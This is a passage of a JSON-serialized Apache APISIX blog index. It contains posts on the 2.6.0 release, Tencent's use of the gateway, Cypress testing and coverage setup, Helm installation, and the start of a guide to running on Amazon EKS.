help from the community. This year, I will be a mentor for APISIX-related projects. If you are interested in contributing to our Apache APISIX community, I will help you prepare for the start of project development.\\n\\n**Q: What would you like to say to all the students who want to participate in the Summer 2021 of Open Source Promotion Plan?**\\n\\n**Zeping**: An experience in the Open Source Promotion Plan can sharpen your skills and help you get started faster in collaborating and participating in open-source projects. There are many projects you can apply for and the preparations are not that difficult. So don\'t hesitate! Just join us!"},{"id":"2021/05/25/apache-apisix-2.6.0-release","metadata":{"permalink":"/blog/2021/05/25/apache-apisix-2.6.0-release","source":"@site/blog/2021/05/25/Apache APISIX 2.6.0-Release.md","title":"Apache APISIX Release 2.6.0","description":"Cloud native API gateway Apache APISIX 2.6.0-Release is officially released! Support more new functions, welcome to download and use.","date":"2021-05-25T00:00:00.000Z","formattedDate":"May 25, 2021","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":3.565,"truncated":true,"authors":[{"name":"Zexuan Luo","url":"https://github.com/spacewander","imageURL":"https://avatars.githubusercontent.com/u/4161644?v=4"}],"prevItem":{"title":"First Experience with Apache APISIX Shared by Student in OSPP 2020","permalink":"/blog/blog/2021/06/03/firsthand-experience-with-apache-apisix-from-ospp-2020-students"},"nextItem":{"title":"API Gateway Practice in Tencent with APISIX","permalink":"/blog/2021/05/24/tencent-games"}},"content":"> Apache APISIX 2.6.0-Release is officially released! Welcome to download and use.\\n\\n\x3c!--truncate--\x3e\\n\\n## Release Notes\\n\\n### New feature: APISIX now supports writing custom plugins in other languages\\n\\nAPISIX now supports writing plug-ins in Lua to perform custom logic during proxy requests, such as calling webhook to notify external systems, performing special authentication logic, and so on. However, there are cases where developers may want to write plugins in languages other than Lua.\\n\\nFor example, developers are not familiar with Lua and want to write plugins in a language they are familiar with, or third-party teams only provide the Java SDK and there is no way to use it inside Lua plugins.\\n\\nStarting from version 2.6, APISIX supports running plugins written in languages other than Lua with the help of plugin runner. The architecture diagram is as follows.\\n\\n![2021-05-25-1](https://static.apiseven.com/202108/1639462480260-86431748-7dcd-4643-816b-92104ec5a666.png)\\n\\nAPISIX will run the plugin runner as a sidecar.\\n\\nThey communicate with each other using RPC, with APISIX sending the request data and configuration and plugin runner loading the user\'s custom plugin, processing that data and telling APISIX what to do with the requests. Currently, it supports executing logic written in non-Lua languages before the proxy request goes upstream. Later on there will be support for rewriting responses in non-Lua languages.\\n\\nAPISIX now places two entry points for the plugin runner to send RPCs: ext-plugin-pre-req, which runs before the Lua plugin logic is executed, and ext-plugin-post-req, which runs after the Lua plugin is executed and before the proxy request goes upstream. Both entries can be dynamically switched on and off at the route level.\\n\\nAssuming we have ext-plugin-pre-req enabled for some requests, and the plugin runner has the validator and rewrite plugins loaded, then for each matching request, it will trigger an RPC call to the plugin runner, first executing the Based on the result, APISIX can determine whether to continue executing the request or reject it. If the request continues, it will run the Lua plugins built into APISIX, such as the flow and speed limiting plugins. If ext-plugin-post-req is enabled, the opposite is true.\\n\\nThe plugin runner for Java and Go is already in development. The Java version of the plugin runner is expected to be available within this week, and the Go version of the plugin runner will be completed in June.\\n\\n### Security enhancement: change the Prometheus default port to no longer expose the port to the data plane\\n\\nPreviously, by default, Prometheus data would be exposed to the port on the data plane, and although you could restrict IP access by configuring the plugin interceptor, there was still the problem of insecurity by default. So starting with 2.6, a new port is dedicated to exposing metrics and by default only listens to 127.0.0.1 .\\n\\nPrior to 2.6, Prometheus collected APISIX metrics on the data side of the port (default port 9080).\\n\\nThe new port is port 9091 and only listens to 127.0.0.1. You need to change the listening address to your server\'s intranet address and add a firewall rule to ensure that only Prometheus can access it.\\n\\n### Support: Ecological full support for Nacos service discovery\\n\\nAPISIX adds support for the Nacos service discovery feature.\\n\\nUsers only need to enable the Nacos service discovery function and set the service name in the upstream configuration, and APISIX will periodically get the instance address of the corresponding service in Nacos based on the service name in the background. In this way, there is no need to configure the specific upstream node address inside APISIX, only inside Nacos.\\nCurrently, the following external services are supported by APISIX built-in service discovery function.\\n\\n1. DNS\\n2. Consul KV mode\\n3. Eureka\\n4. Nacos\\n\\n### Support: Configuring DNS resolver for IPv6\\n\\nPreviously, when configuring DNS resolver for APISIX, only IPv4 servers could be configured. Since version 2.6, we have added support for IPv6 DNS servers.\\n\\nNow when configuring DNS resolver, you can write IPv6 server address.\\n\\n## Download\\n\\nTo download the Apache APISIX 2.6.0-Release source code and binary installation package, please visit the download page: `https://apisix.apache.org/downloads/`.\\n\\n## Documentation Update\\n\\nDuring this release, we are also continuously updating and releasing new documentation for use, and welcome your valuable comments.\\n\\n`https://apisix.apache.org/docs/apisix/getting-started/`\\n\\nFor more details, see the Changelog for version 2.6 and the Apache APISIX commits on GitHub."},{"id":"2021/05/24/tencent-games","metadata":{"permalink":"/blog/2021/05/24/tencent-games","source":"@site/blog/2021/05/24/Tencent-Games.md","title":"API Gateway Practice in Tencent with APISIX","description":"This article introduces what a gateway is and its improvement to the traditional service architecture, and the implementation of APISIX within Tencent.","date":"2021-05-24T00:00:00.000Z","formattedDate":"May 24, 2021","tags":[{"label":"Case Studies","permalink":"/blog/tags/case-studies"}],"readingTime":8.215,"truncated":true,"authors":[{"name":"Xin Xu"}],"prevItem":{"title":"Apache APISIX Release 2.6.0","permalink":"/blog/2021/05/25/apache-apisix-2.6.0-release"},"nextItem":{"title":"Get Front-End Test Coverage with Cypress","permalink":"/blog/2021/03/02/get-front-end-test-coverage-with-cypress"}},"content":"> This article is a lecture note from the speech given by Xin Xu, an engineer in charge of internal container platform of Tencent Games, at the Apache APISIX Meetup - Shenzhen. By reading this article, you can not only learn what a gateway is and how the gateway model improves the traditional service architecture, but also understand the reasons for the birth of Tencent OTeam and how Apache APISIX is implemented inside Tencent.\\n\\n\x3c!--truncate--\x3e\\n\\n## What is an API Gateway?\\n\\n### Traditional architecture\\n\\nBefore integrating with API Gateway, we have few ways to reuse some general functionalities, such as:\\n\\n- Security: authentication, authorization, anti-replay, anti-tampering, anti-DDoS, etc.\\n\\n- Reliability: service degradation, fusing, traffic limiting, and so on.\\n\\nUnder the traditional architecture, the most common way to deal with this case is to put them into a service framework and implement them through AOP, similar to the following architecture diagram:\\n\\n![Traditional architecture](https://static.apiseven.com/202108/1630640321175-ee272ad4-d8ee-45f3-8b67-9630fb534a82.png)\\n\\nThe traditional architecture diagram has the following modules.\\n\\n- Backend: Backend services\\n\\n- AOP: AOP layering carried by the framework;\\n\\n- SD: Service Center, used for internal service discovery. In cloud-native technologies, we often use Service to replace this component;\\n\\n- LB: Load balancer, we use it on the network boundary as an entry point for external traffic.\\n\\nThis kind of architecture was widespread in the design of the early years, which gave birth to many extensive and comprehensive service frameworks, such as Dubbo, SpringCloud, etc., and we will find that most of them have many similar features.\\n\\nThe advantage of this architecture is that the upstream and downstream relationships are more accessible and more apparent, and it reduces one forwarding in the network transmission. But their disadvantages are also obvious:\\n\\n- Standard features force business service updates: since code references are used, we have to recompile business services to make the features effective. Some teams that do not achieve rolling release have to release during the idle of the business.\\n\\n- Hard to manage versions: Since we cannot upgrade all services to the latest version every time we release, after a period, the performance of various services will be inconsistent.\\n\\nWhy not put those same functions in a standalone service, which can upgrade or maintain separately?\\n\\n### Gateway mode\\n\\n![Gateway mode](https://static.apiseven.com/202108/1630640321180-bd19ad6c-6116-4982-98e8-3b626285ed03.png)\\n\\nCompared with traditional architecture, We can see an additional component between the backend services and the LB: Gateway.\\n\\nA gateway usually contains many standard and reusable features, such as Authentication, Traffic Management, etc. The following are the benefits we could get:\\n\\n- Gateway is a dependent component on the systems, and we could have a better maintain experience.\\n\\n- Gateway is language-independent.\\n  \\nHowever, the gateway mode also has its disadvantages:\\n\\n- Because we proxy traffic to the gateway first, we have one more forwarding and higher latency. It will cause a higher complexity of troubleshooting problems.\\n\\n- If the gateway does not work correctly, it may become a bottleneck for the entire system.\\n\\nHow to balance the benefits and disadvantages of the gateway model is a challenge for the technical team. Let\u2019s see how the Tencent OTeam works with Apache APISIX.\\n\\n## Introduction\\n\\n### OTeam\\n\\nTencent\u2019s OTeam is a group of teams, and every team maintains one or several technical products. They aim to build a stable but robust mid-platform for internal systems. One of the OTeam supports Tencent\u2019s internal Apache APISIX customization distribution.\\n\\nIn order to integrate the duplicate wheels within the company and sink the technical middle ground. Tencent put several technical products of the same nature into the same Oteam, integrating the maintenance staff and firing them all together, so that they could gradually merge into one big and comprehensive product, which is Oteam.\\n\\nSome Oteams have as many as a dozen products under them, while others have only one. For example, the Oteam where Apache APISIX is located has only one product, Apache APISIX. The original purpose of this Oteam is to maintain the customization features of Apache APISIX within Tencent.\\n\\n### Apache APISIX\\n\\n[Apache APISIX](https://apisix.apache.org/) is a Top-Level Project from the Apache Software Foundation, and here are some key points:\\n\\n- Apache APISIX is a cloud-native, dynamic API gateway based on OpenResty, with a higher routing performance than Kong.\\n\\n- Apache APISIX provides rich traffic management features such as load balancing, dynamic upstream, canary release, circuit breaking, authentication, observability, and more.\\n\\n- Apache APISIX is good at handling traditional north-south traffic, as well as east-west traffic between services. It can also be used as a k8s ingress controller.\\n\\n- Apache APISIX default uses ETCD as the configuration center, which can update the configuration in seconds.\\n\\n- Apache APISIX graduates from Apache Software Foundation and only takes a few months.\\n\\n## Tencent OTeam\u2019s operational strategy\\n\\n![OTeam operational strategy](https://static.apiseven.com/202108/1646831516782-bd2d1b56-0e63-4dc8-a53a-c891c6a11d6d.png)\\n\\nThe above diagram shows how the OTeam works with Apache APISIX\u2019s community:\\n\\n- Users give feedback or requirements via GitHub Issue.\\n\\n- OTeam members discuss solutions at weekly meetings or reply directly in Issue.\\n\\n- Implement features or fix bugs according to discussion.\\n\\n- Code Review and CI check, then release if necessary.\\n\\nThis process is just like other Open Source projects. Here are some key points:\\n\\n- After solving the Issue, Tencent engineers will determine whether the problem is also a common problem for the community. If so, they will file a PR to the community.\\n\\n- Tencent OTeam will regularly review Apache APISIX\u2019s new features to determine whether it is stable and whether it is also a pain point for Tencent. If the answer is yes, pick the relevant codes.\\n\\nIn the beginning, OTeam would sync codes with Apache APISIX every 12 hours so that we could follow up Apache APISIX quickly, but this approach brought some problems:\\n\\n- After syncing codes with Apache APISIX, we could make sure regulations are correct but couldn\u2019t ensure the codes are stable. Some occasional errors happened in concurrency cases.\\n\\n- The merged codes sometimes cause multiple PR upstream conflicts logically, but Apache APISIX and OTeam\u2019s CI cannot detect this case. Only when we merge PRs to the master branch could we find something wrong happened.\\n\\nFor these reasons, OTeam is now moving to pick codes for required features after internal reviews.\\n\\n## OTeam Trend\\n\\nAs of May 2021, OTeam has landed Apache APISIX for more than ten teams within Tencent, with the enormous daily business request traffic exceeding one billion. At the same time, OTeam has also developed more than ten features for Apache APISIX, including Service Discovery, RPC Protocol Conversion, and connect with the monitoring platform.\\n\\nAt the same time, OTeam has also contributed some standard features to Apache APISIX\u2019s community. At present, two members of the OTeam team are also PMCs of the Apache APISIX, and OTeam has contributed more than 50 PRs to the community. We believe that OTeam will keep cooperating with the Apache APISIX community in the future.\\n\\n## OTeam Internal Features\\n\\n### Internal pain points\\n\\nOTeam\u2019s primary responsibility is to maintain Apache APISIX\u2019s features for Tencent. Let\u2019s take a look at what pain points OTeam met.\\n\\n- The RPC framework is not friendly to the frontend: there are many legacy projects within Tencent that use the TARS framework, it does not directly support the HTTP protocol like TRPC, it only supports the most traditional TCP protocol of the RPC framework, and the transport content uses a specific binary protocol. We need to maintain an intermediate service to convert these interfaces into a frontend-friendly HTTP + JSON form.\\n\\n- Diversification of service centers: There are many Service Centers in Tencent\u2019s internal services, such as CL5, L5, Polaris, etc. Although we will gradually use the same Service Center, we will use multiple service centers simultaneously during this extended period. The initial Apache APISIX does not support this.\\n\\n- Alarm: As a gateway, the alarm is not a direction it should pay attention to, but as a fundamental component, the alarm must be a required component to the team. How to solve the alarm problem is also a pain point.\\n\\n- Security: Tencent has a large amount of traffic and security requirements. A log of toC products are using OTeam, and they have to face a large number of users\u2019 misuse and attacks from the network. The most typical cases are DDos, replay, tampering requests, etc. Can we solve these issues at the gateway layer?\\n\\n### Problem-solving\\n\\n![OTeam arichitecture](https://static.apiseven.com/202108/1646831157962-78e0d276-37d9-4bf7-a841-b9600b0ce1f9.png)\\n\\nThe above diagram comes from a simplification of a landing case within Tencent. We can see several problems just raised have been solved in OTeam:\\n\\n- Protocol Conversion: based on Apache APISIX, OTeam achieves TRPC and TARS protocol conversion. Those who do not perform HTTP legacy services can directly use the conversion plugin in the gateway to attaining HTTP and RPC transfer requirements without writing intermediate services.\\n\\n- Multiple Service Centers: We have contributed this feature to the community.\\nReport to monitoring platform: Tencent OTeam uses plugins to connect with monitoring platforms. Users only need to do some configurations, and then the system will automatically report metrics, logs. By the way, users can configure alarm policies on the monitoring platform.\\n\\n- Anti-replay and anti-tampering: OTeam implements anti-replay and anti-tampering plugins, allowing external businesses that need these capabilities to use them directly out of the box to protect their APIs security.\\n\\nWe hope that these examples can help you explore more Apache APISIX usage scenarios and better use it as a helpful platform. For example, someone used the gateway to implement some API specifications mandatory according to Tencent Cloud policies.\\n\\n## Summary\\n\\nOTeam helped the business team solve their pain points and continuously improved the features of Apache APISIX within Tencent, and move forward with the development of the community.\\n\\nIf your team does not have a gateway, you can search and learn more about Apache APISIX and are welcome to participate in the Apache APISIX community.\\n\\nFor more videos about Apache APISIX, please visit https://www.bilibili.com/video/BV1yK4y1G7CP/ ."},{"id":"Get Front-End Test Coverage with Cypress","metadata":{"permalink":"/blog/2021/03/02/get-front-end-test-coverage-with-cypress","source":"@site/blog/2021/03/02/get-front-end-test-coverage-with-cypress.md","title":"Get Front-End Test Coverage with Cypress","description":"This article will explain how to use Cypress to get API Gateway Apache APISIX Dashboard front-end E2E coverage and what is code coverage.","date":"2021-03-02T00:00:00.000Z","formattedDate":"March 2, 2021","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":2.165,"truncated":true,"authors":[{"name":"Yi Sun","url":"https://github.com/LiteSun","imageURL":"https://avatars.githubusercontent.com/u/31329157?s=400&u=e81b4bb4db2be162c1fcac6d188f5b0f82f71920&v=4"}],"prevItem":{"title":"API Gateway Practice in Tencent with APISIX","permalink":"/blog/2021/05/24/tencent-games"},"nextItem":{"title":"Install Apache APISIX from Helm Charts","permalink":"/blog/2021/02/26/install-apache-apisix-from-helm-charts"}},"content":"> In the article [\\"Stable Product Delivery with Cypress\\"](/blog/2021/02/08/stable-product-delivery-with-cypress), we discussed why we chose Cypress as our E2E testing framework. After spending nearly two months refining the test cases, we needed test coverage to quantify whether the test coverage was sufficient.This article will describe how to get APISIX Dashboard front-end E2E coverage using Cypress.\\n\\n\x3c!--truncate--\x3e\\n\\n> Source:\\n>\\n> - https://github.com/apache/apisix\\n> - https://github.com/apache/apisix-dashboard\\n\\n## What is code coverage\\n\\nCode coverage is a metric in software testing that describes the proportion and extent to which the source code in a program is tested, and the resulting proportion is called code coverage. Test code coverage reflects the health of the code to a certain extent.\\n\\n## Installation Dependencies & Configuration\\n\\nTo collect test coverage data, we need to put some probes in the original business code for Cypress to collect the data.\\n\\nCypress officially recommends two approaches, the first is to generate a temporary directory via `nyc` and run the code that has been written to the probe to collect test coverage data. The second way is to do the code conversion in real time through the code conversion pipeline, which eliminates the hassle of temporary folders and makes collecting test coverage data relatively refreshing. We choose the second way to collect front-end E2E coverage.\\n\\n1. Installing Dependencies\\n\\n```shell\\nyarn add  babel-plugin-istanbul --dev\\n```\\n\\n2. Install the cypress plug-in\\n\\n```shell\\nyarn add  @cypress/code-coverage --dev\\n```\\n\\n3. Configuring babel\\n\\n```ts\\n// web/config/config.ts\\nextraBabelPlugins: [\\n    [\'babel-plugin-istanbul\',  {\\n      \\"exclude\\": [\\"**/.umi\\", \\"**/locales\\"]\\n    }],\\n  ],\\n```\\n\\n4. Configuring Cypress code coverage plugin\\n\\n```javaScript\\n// web/cypress/plugins/index.js\\nmodule.exports = (on, config) => {\\n  require(\'@cypress/code-coverage/task\')(on, config);\\n  return config;\\n};\\n```\\n\\n```javaScript\\n// web/cypress/support/index.js\\nimport \'@cypress/code-coverage/support\';\\n```\\n\\n5. Get Test Coverage\\n\\nAfter the configuration is done, we need to run the test case. After the test case is run, Cypress will generate `coverage` and `.nyc_output` folders, which contain the test coverage reports.\\n\\n![1.png](https://lh4.googleusercontent.com/o-tyQagmCjprpNkuTjMFLaALZKtW4pyC9nj-GcPx4MM3xK0zrMED9Nndk5ZmZkZsQ5SIJPEovcrHyjWP2YXtEcYYDpLL49aV_97N83doTkOuMXlFsVjGu53A9FdlxOCr6i3aIDTA)\\n\\nThe test coverage information will appear in the console after executing the following command.\\n\\n```shell\\nnpx nyc report --reporter=text-summary\\n```\\n\\n![2.png](https://lh4.googleusercontent.com/n0CON1WF64wEnh3IYEc3wwwOJ2Ft_WmMLfkhOPKIKxoW0NP6Eq8VplJ87EepL5zIWOeyfJhlDmhc3ImE0ivgRlXWe1RuW2x7vL_JEri7Mz6b3tOY0it8bVvUe83CAHNgeoyXZnsy)\\n\\nUnder the coverage directory, a more detailed report page will be available, as shown here.\\n\\n![3.png](https://lh4.googleusercontent.com/skjR9YUcbmeytfoYnR0it7Vfc7mheCJDt7PSUsp549IbOdfqskTrIOqUXw01e0fnuNwpGoo3GtqAER3eQjNoTIdmU7HY6hc_sZ5NYc3h-MyxqmVz_NaC3AM-J4rWJFy-9IoTWjpn)\\n\\n- Statements indicates whether each statement was executed\\n\\n- Branches indicates whether each if block was executed\\n\\n- Functions indicates whether each function is called\\n\\n- Lines indicates whether each line was executed\\n\\n## Summary\\n\\nThe test coverage rate reflects the quality of the project to a certain extent. At present, APISIX Dashboard front-end E2E coverage rate has reached 71.57%. We will continue to work with the community to enhance the test coverage rate and provide more reliable and stable products for users."},{"id":"Install Apache APISIX from Helm Charts","metadata":{"permalink":"/blog/2021/02/26/install-apache-apisix-from-helm-charts","source":"@site/blog/2021/02/26/install-apache-apisix-from-helm-charts.md","title":"Install Apache APISIX from Helm Charts","description":"API7.ai released a Helm Charts repository. Users can easily install Apache APISIX, Apache apisix-dashboard, and Apache apisix-ingress-controller from it.","date":"2021-02-26T00:00:00.000Z","formattedDate":"February 26, 2021","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":0.88,"truncated":true,"authors":[{"name":"Chao Zhang","url":"https://github.com/tokers","imageURL":"https://avatars.githubusercontent.com/u/10428333?s=400&u=f48ef50c5621a1616a3ede50221547e34270e061&v=4"}],"prevItem":{"title":"Get Front-End Test Coverage with Cypress","permalink":"/blog/2021/03/02/get-front-end-test-coverage-with-cypress"},"nextItem":{"title":"Stable Product Delivery with Cypress","permalink":"/blog/2021/02/08/stable-product-delivery-with-cypress"}},"content":"> A few days ago, [API7.ai](https://www.apiseven.com/) released an online Helm Charts repository. Users can easily install Apache APISIX, Apache apisix-dashboard and Apache apisix-ingress-controller from it (rather than cloning the corresponding project in advance).\\n\\n\x3c!--truncate--\x3e\\n\\n## How To Use\\n\\nJust a few steps to install Apache APISIX\\n\\n1. Add the repository and fetch the update\\n\\n   ```sh\\n   $ helm repo add apisix https://charts.apiseven.com\\n   $ helm repo update\\n   ```\\n\\n2. Check out the available charts in repository\\n\\n   ```sh\\n   $ helm search repo apisix\\n\\n   NAME                    CHART VERSION   APP VERSION     DESCRIPTION\\n   apisix/apisix           0.1.2           2.1.0           A Helm chart for Apache APISIX\\n   apisix/apisix-dashboard 0.1.0           2.3.0           A Helm chart for Apache APISIX Dashboard\\n   ```\\n\\n3. Install Apache APISIX to your Kubernetes cluster\\n\\n   ```sh\\n   $ helm install apisix-gw apisix/apisix --namespace default\\n\\n   NAME: apisix-gw\\n   LAST DEPLOYED: Fri Feb 19 11:34:14 2021\\n   NAMESPACE: default\\n   STATUS: deployed\\n   REVISION: 1\\n   TEST SUITE: None\\n   NOTES:\\n   1. Get the application URL by running these commands:\\n     export NODE_PORT=$(kubectl get --namespace default -o jsonpath=\\"{.spec.ports[0].nodePort}\\" services apisix-gw-gateway)\\n     export NODE_IP=$(kubectl get nodes --namespace default -o jsonpath=\\"{.items[0].status.addresses[0].address}\\")\\n     echo http://$NODE_IP:$NODE_PORT\\n   ```\\n\\n## Reference\\n\\n- https://github.com/apache/apisix-helm-chart\\n- https://github.com/apache/apisix"},{"id":"Stable Product Delivery with Cypress","metadata":{"permalink":"/blog/2021/02/08/stable-product-delivery-with-cypress","source":"@site/blog/2021/02/08/stable-product-delivery-with-cypress.md","title":"Stable Product Delivery with Cypress","description":"This article describes what E2E testing is and why the API Gateway Apache APISIX dashboard uses Cypress for stable product delivery.","date":"2021-02-08T00:00:00.000Z","formattedDate":"February 8, 2021","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":5.515,"truncated":true,"authors":[{"name":"Yi Sun","url":"https://github.com/LiteSun","imageURL":"https://avatars.githubusercontent.com/u/31329157?s=400&u=e81b4bb4db2be162c1fcac6d188f5b0f82f71920&v=4"}],"prevItem":{"title":"Install Apache APISIX from Helm Charts","permalink":"/blog/2021/02/26/install-apache-apisix-from-helm-charts"},"nextItem":{"title":"Run Ingress APISIX on Amazon EKS","permalink":"/blog/2021/01/21/run-ingress-apisix-on-amazon-eks"}},"content":"> This article explains how Yi Sun, GitHub ID [@LiteSun](https://github.com/LiteSun), became Apache APISIX Committer from [API7.ai](https://www.apiseven.com/), implements stable product delivery with Cypress.\\n\\n\x3c!--truncate--\x3e\\n\\n> Source:\\n>\\n> - https://github.com/apache/apisix\\n> - https://github.com/apache/apisix-dashboard\\n\\n## Background\\n\\nThe Apache APISIX Dashboard is designed to make it as easy as possible for users to operate Apache APISIX through a front-end interface, and since the project\'s inception, there have been 552 commits and 10 releases. With such rapid product iteration, it is important to ensure the quality of the open-source product. For this reason, we have introduced an E2E testing module to ensure stable product delivery.\\n\\n## What is Front-End E2E\\n\\nE2E, which stands for \\"End to End\\", can be translated as \\"end-to-end\\" testing. It mimics user behavior, starting with an entry point and executing actions step-by-step until a job is completed. Sound testing prevents code changes from breaking the original logic.\\n\\n## Why Cypress\\n\\nWe used Taiko, Puppeteer, TestCafe, and Cypress to write test cases for creating routes during the selection research period, and we used each testing framework to write cases to experience their respective features.\\n\\nTaiko is characterized by smart selector, which can intelligently locate the elements that you want to operate based on text content and location relations, and has a low start-up cost, so you can finish the test cases quickly. However, it is not user-friendly when writing test cases. When the user exits the terminal by mistake, all the written test cases are lost, and if you want to run a complete test case, you need to use it together with other test runners, which undoubtedly increases the learning cost for the user.\\n\\nPuppeteer has the best performance. However, testing is not the focus of Puppeteer. It is widely used for web crawlers. Our project started with Puppeteer, the official E2E testing framework recommended by ANTD, and after using it for a while we found that Puppeteer did not look so friendly to non-front-end developers and it was hard to get other users involved. When users write test cases, the lack of intelligent element positioning makes the learning curve very high.\\n\\nTestCafe is surprisingly easy to install, it has a built-in waiting mechanism so that users don\'t have to actively sleep waiting for page interactions, and it supports concurrent multi-browser testing, which is helpful for multi-browser compatibility testing. The disadvantage is that its debugging process is not so user-friendly, and you have to run a new use case after each test case change. For the developers, they need to have some basic Javascript syntax. Secondly, its running speed is relatively slow for several other frameworks, especially when executing withText () to find elements.\\n\\nAfter a comprehensive comparison, we finally chose Cypress as our front-end E2E framework, listing four main reasons:\\n\\n1. Simple syntax\\n\\nThe syntax used in Cypress tests is very simple and easy to read and write. With a little practice, you can master creating test cases, which is important for open source projects because it allows the community interested in E2E test cases to participate in writing test cases with minimal learning cost.\\n\\n2. Easy debugging\\n\\nWhen debugging test cases, we can use Cypress\'s Test Runner, which presents multi-dimensional data that allows us to quickly pinpoint the problem.\\n\\n- Showing the status of the test case execution, including the number of successes, failures, and runs in progress.\\n- Displaying the total time spent on the execution of the entire test set.\\n- A built-in Selector Playground to help locate elements.\\n- shows each step of execution for each use case and forms a snapshot that can show information about each execution step after it is completed.\\n\\n3. Active community\\n\\nCypress has a large community of users, and there are always many people inside the community sharing their experiences and ideas.\\n\\nThis is helpful when encountering problems, and you are likely to encounter problems that others have encountered before. Also, when new features are requested, we can participate in the community by discussing and adding features to Cypress that we want to add, just like we do in the APISIX community: listening to the community and feeding it back.\\n\\n4. Clear documentation\\n\\nCypress\'s documentation structure is clearer and more comprehensive. In the early stages of use, we were able to quickly introduce Cypress into our project and write our first case based on the official documentation guidelines. In addition, there is a large amount of documentation available on the documentation site that gives users good guidance on what is best practice.\\n\\n## Cypress and APISIX Dashboard\\n\\nThere are currently 49 test cases written for the APISIX Dashboard. We configured the corresponding CI in GitHub Action to ensure that the code passes before each merge to ensure code quality. We share the use of Cypress in APISIX Dashboard with you by referring to Cypress best practices and combining them with our project.\\n\\n![image](https://static.apiseven.com/202102/image.png)\\n\\n1. Commonly used functions are encapsulated into commands.\\n\\n  Take login as an example, login is an essential part of entering the system, so we encapsulate it as a command, so that the login command can be called before each case run.\\n\\n  ```javaScript\\n  Cypress.Commands.add(\\"login\\", () => {\\n    cy.request(\\n      \\"POST\\",\\n      \'http://127.0.0.1/apisix/admin/user/login\',\\n      {\\n        username: \\"user\\",\\n        password: \\"user\\",\\n      }\\n    ).then((res) => {\\n      expect(res.body.code).to.equal(0);\\n      localStorage.setItem(\\"token\\", res.body.data.token);\\n    });\\n  });\\n  ```\\n\\n  ```javaScript\\n  beforeEach(() => {\\n    // init login\\n    cy.login();\\n  })\\n```\\n\\n2. Extract the selector and data as public variables.\\n\\nTo make it more intuitive for the user to understand the meaning of the test code, we extract a selector and data as public variables.\\n\\n```javaScript\\n\xa0 const data = {\\n\xa0 \xa0 name: \'hmac-auth\',\\n\xa0 \xa0 deleteSuccess: \'Delete Plugin Successfully\',\\n\xa0 };\\n\xa0 const domSelector = {\\n\xa0 \xa0 tableCell: \'.ant-table-cell\',\\n\xa0 \xa0 empty: \'.ant-empty-normal\',\\n\xa0 \xa0 refresh: \'.anticon-reload\',\\n\xa0 \xa0 codemirror: \'.CodeMirror\',\\n\xa0 \xa0 switch: \'#disable\',\\n\xa0 \xa0 deleteBtn: \'.ant-btn-dangerous\',\\n\xa0 };\\n```\\n\\n3. Remove cy.wait(someTime)\\n\\nWe used cy.wait(someTime) in the early days of Cypress, but found that cy.wait(someTime) relies too much on the network environment and the performance of the test machine, which can cause test cases to report errors when the network environment or machine performance is poor. The recommended practice is to use it in conjunction with cy.intercept() to explicitly specify the network resources to wait for.\\n\\n```javascript\\ncy.intercept(\\"https://apisix.apache.org/\\").as(\\"fetchURL\\");\\ncy.wait(\\"@fetchURL\\");\\n```\\n\\n## Summary\\n\\nAt present, APISIX Dashboard has written 49 test cases. In the future, we will continue to enhance the front-end E2E coverage, and require the community to agree to write test cases for each new feature or bugfix submission to ensure the stability of the product.\\n\\nWelcome to join us to polish the world-class gateway product.\\n\\nProject repository: [https://github.com/apache/apisix-dashboard](https://github.com/apache/apisix-dashboard)"},{"id":"Run Ingress APISIX on Amazon EKS","metadata":{"permalink":"/blog/2021/01/21/run-ingress-apisix-on-amazon-eks","source":"@site/blog/2021/01/21/run-ingress-apisix-on-amazon-eks.md","title":"Run Ingress APISIX on Amazon EKS","description":"This article details how to run the cloud-native API gateway Apache APISIX and apisix-ingress-controller on Amazon EKS.","date":"2021-01-21T00:00:00.000Z","formattedDate":"January 21, 2021","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":4.225,"truncated":true,"authors":[{"name":"Chao Zhang","url":"https://github.com/tokers","imageURL":"https://avatars0.githubusercontent.com/u/10428333?s=60&v=4"}],"prevItem":{"title":"Stable Product Delivery with Cypress","permalink":"/blog/2021/02/08/stable-product-delivery-with-cypress"},"nextItem":{"title":"Apache APISIX Contributor Interview | Pengcheng Wang from PricewaterhouseCoopers","permalink":"/blog/2021/01/11/interview-apache-apisix-contributor-wang-pengcheng-senior-security-advisor-of-pwc-south-china-data-security-and-privacy-protection-team"}},"content":"> Amazon EKS provides flexibility to start, run, and scale Kubernetes applications in the AWS cloud or on-premises. This article explains how to run Ingress APISIX on it.This article explains how to run Ingress APISIX on Amazon EKS.\\n\\n\x3c!--truncate--\x3e\\n\\nThis post is based on [Install Ingress APISIX on Amazon EKS](http://apisix.apache.org/docs/ingress-controller/deployments/aws/).\\n\\nAmazon Elastic Kubernetes Service ([Amazon EKS](https://amazonaws-china.com/eks/?whats-new-cards.sort-by=item.additionalFields.postDateTime&whats-new-cards.sort-order=desc&eks-blogs.sort-by=item.additionalFields.createdDate&eks-blogs.sort-order=desc)) gives you the flexibility to start, run, and scale Kubernetes applications in the AWS cloud or on-premises. This article explains how to run Ingress APISIX on it.\\n\\nIngress APISIX brings good features (traffic splitting, multiple protocols, authentication and etc) of Apache APISIX to Kubernetes, with a well-designed Controller component to drive it, which helps users to achieve complex demands for the north-south traffic.\\n\\n## Prerequisites\\n\\nBefore you go ahead, make sure you have an available EKS cluster on Amazon AWS. If you don\'t have one, please create it according to the guide.\\n\\nYou shall have kubectl tool in your own environment, set the context to your EKS cluster by running:\\n\\n```shell\\naws eks update-kubeconfig --name <your eks cluster name> --region <your region>\\n```\\n\\nAfter the Kubernetes cluster is ready, creating the namespace ingress-apisix, all subsequent resources will be created at this namespace.\\n\\nkubectl create namespace ingress-apisix\\n\\nWe use [Helm](https://helm.sh/) to deploy all components in Ingress APISIX ([Apache APISIX](https://github.com/apache/apisix) and [apisix-ingress-controller](https://github.com/apache/apisix-ingress-controller)), so please also install Helm according to its installation guide. The helm charts for Apache APISIX and apisix-ingress-controller are in apache/apisix-helm-chart and apache/apisix-ingress-controller, clone them to get the charts.\\n\\n## Install Apache APISIX\\n\\nApache APISIX as the proxy plane of apisix-ingress-controller, should be deployed in advance.\\n\\n```shell\\ncd /path/to/apisix-helm-chart\\nhelm repo add bitnami https://charts.bitnami.com/bitnami\\nhelm dependency update ./chart/apisix\\nhelm install apisix ./chart/apisix \\\\\\n  --set 